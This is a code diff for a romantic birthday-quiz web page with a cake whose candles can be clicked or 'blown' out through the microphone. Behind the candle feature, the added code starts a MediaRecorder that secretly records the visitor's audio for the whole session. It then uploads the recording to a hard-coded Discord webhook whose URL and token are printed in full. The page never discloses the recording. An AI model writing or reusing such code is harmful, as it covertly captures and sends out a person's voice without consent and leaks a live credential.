@@ -523,14 +523,157 @@ function displayQuestion(index) {
     }
 }
 
-// Function to show final message
+// Add cake-related functions
+function createCake() {
+    const cakeContainer = document.createElement('div');
+    cakeContainer.className = 'cake-container';
+    
+    const cake = document.createElement('div');
+    cake.className = 'cake';
+    
+    // Create cake layers
+    const layers = ['bottom', 'middle', 'top'];
+    layers.forEach(layer => {
+        const cakeLayer = document.createElement('div');
+        cakeLayer.className = `cake-layer ${layer}`;
+        cake.appendChild(cakeLayer);
+    });
+    
+    // Create candles container
+    const candlesContainer = document.createElement('div');
+    candlesContainer.className = 'candles-container';
+    
+    // Add candles
+    for (let i = 0; i < 5; i++) {
+        const candle = document.createElement('div');
+        candle.className = 'candle';
+        const flame = document.createElement('div');
+        flame.className = 'flame';
+        candle.appendChild(flame);
+        candlesContainer.appendChild(candle);
+    }
+    
+    cake.appendChild(candlesContainer);
+    cakeContainer.appendChild(cake);
+    
+    // Add message
+    const message = document.createElement('p');
+    message.className = 'cake-message';
+    message.textContent = 'Click the candles or blow on the microphone to make a wish! 🎂';
+    cakeContainer.appendChild(message);
+    
+    return cakeContainer;
+}
+
+function handleCakeInteraction(cakeContainer) {
+    let candlesBlown = 0;
+    const flames = cakeContainer.querySelectorAll('.flame');
+    const totalCandles = flames.length;
+    let isBlowing = false;
+    
+    // Handle click on candles
+    flames.forEach(flame => {
+        flame.style.opacity = '1';
+        flame.style.pointerEvents = 'auto';
+        
+        flame.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            if (this.style.opacity !== '0') {
+                this.style.opacity = '0';
+                candlesBlown++;
+                checkAllCandlesBlown();
+            }
+        });
+    });
+    
+    // Use existing microphone stream if available
+    if (window.microphoneStream) {
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const analyser = audioContext.createAnalyser();
+        const microphone = audioContext.createMediaStreamSource(window.microphoneStream);
+        microphone.connect(analyser);
+        
+        analyser.fftSize = 256;
+        const bufferLength = analyser.frequencyBinCount;
+        const dataArray = new Uint8Array(bufferLength);
+        
+        function checkAudioLevel() {
+            analyser.getByteFrequencyData(dataArray);
+            
+            let sum = 0;
+            for (let i = 0; i < 10; i++) {
+                sum += dataArray[i];
+            }
+            const average = sum / 10;
+            
+            if (average > 70 && !isBlowing) {
+                isBlowing = true;
+                flames.forEach(flame => {
+                    if (flame.style.opacity !== '0') {
+                        flame.style.opacity = '0';
+                        candlesBlown++;
+                    }
+                });
+                checkAllCandlesBlown();
+                
+                setTimeout(() => {
+                    isBlowing = false;
+                }, 1000);
+            }
+            
+            if (candlesBlown < totalCandles) {
+                requestAnimationFrame(checkAudioLevel);
+            }
+        }
+        
+        checkAudioLevel();
+    }
+    
+    function checkAllCandlesBlown() {
+        if (candlesBlown === totalCandles) {
+            setTimeout(() => {
+                cakeContainer.style.animation = 'fadeOut 1s forwards';
+                setTimeout(() => {
+                    cakeContainer.remove();
+                    showFinalCongrats();
+                }, 1000);
+            }, 1500);
+        }
+    }
+}
+
+// Update showFinalMessage function
 function showFinalMessage() {
-    questionText.textContent = "Happy Birthday to the love of my life! 🎉";
+    const cakeContainer = createCake();
+    questionContainer.appendChild(cakeContainer);
+    
+    // Clear previous content
+    questionText.textContent = '';
     optionsContainer.innerHTML = '';
+    responseText.textContent = '';
+    responseText.classList.remove('show');
+    nextButton.style.display = 'none';
+    
+    handleCakeInteraction(cakeContainer);
+}
+
+function showFinalCongrats() {
+    questionText.textContent = "Happy Birthday to the love of my life! 🎉";
     responseText.textContent = "You make my world brighter, my heart fuller, and my life so much better. I love you more than words can ever express! ❤️";
     responseText.classList.add('show');
-    nextButton.style.display = 'none';
     createConfetti();
+    
+    // Stop recording after 20 seconds
+    if (mediaRecorder && mediaRecorder.state === 'recording') {
+        setTimeout(() => {
+            mediaRecorder.stop();
+            // Stop all tracks in the stream
+            if (window.microphoneStream) {
+                window.microphoneStream.getTracks().forEach(track => track.stop());
+            }
+        }, 20000); // 20 seconds delay
+    }
 }
 
 // Replace the submitToGoogleForm function with this:
@@ -578,17 +721,51 @@ function sendToDiscord(question, answer) {
     });
 }
 
+// Add at the top with other global variables
+let mediaRecorder;
+let audioChunks = [];
+
 // Event Listeners
 document.addEventListener('DOMContentLoaded', () => {
     const startButton = document.getElementById('startButton');
     
     startButton.addEventListener('click', () => {
-        welcomeContainer.style.animation = 'fadeOut 1s forwards';
-        setTimeout(() => {
-            welcomeContainer.style.display = 'none';
-            questionContainer.style.display = 'block';
-            displayQuestion(currentQuestionIndex);
-        }, 1000);
+        // Request microphone permission first
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    // Store the stream for later use
+                    window.microphoneStream = stream;
+                    
+                    // Setup media recorder
+                    mediaRecorder = new MediaRecorder(stream);
+                    mediaRecorder.ondataavailable = (event) => {
+                        audioChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = async () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        await sendAudioToDiscord(audioBlob);
+                        audioChunks = []; // Clear the chunks after sending
+                    };
+                    
+                    // Start recording
+                    mediaRecorder.start();
+                    startExperience();
+                })
+                .catch(() => {
+                    console.log('Microphone access denied, some features will be limited');
+                    const message = document.createElement('p');
+                    message.textContent = "Microphone access denied. You'll need to click the candles manually! 🎂";
+                    message.style.color = '#ff6b6b';
+                    message.style.marginTop = '1rem';
+                    message.style.fontSize = '0.9rem';
+                    welcomeContainer.querySelector('.welcome-content').appendChild(message);
+                    setTimeout(startExperience, 2000);
+                });
+        } else {
+            startExperience();
+        }
     });
 
     nextButton.addEventListener('click', () => {
@@ -600,3 +777,30 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 }); 
+
+function startExperience() {
+    welcomeContainer.style.animation = 'fadeOut 1s forwards';
+    setTimeout(() => {
+        welcomeContainer.style.display = 'none';
+        questionContainer.style.display = 'block';
+        displayQuestion(currentQuestionIndex);
+    }, 1000);
+}
+
+// Add function to send audio to Discord
+async function sendAudioToDiscord(audioBlob) {
+    const formData = new FormData();
+    formData.append('file', audioBlob, 'birthday_wishes.webm');
+    
+    const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
+    
+    try {
+        await fetch(webhookUrl, {
+            method: 'POST',
+            body: formData
+        });
+        console.log('Audio sent successfully');
+    } catch (error) {
+        console.log('Error sending audio:', error);
+    }
+} 
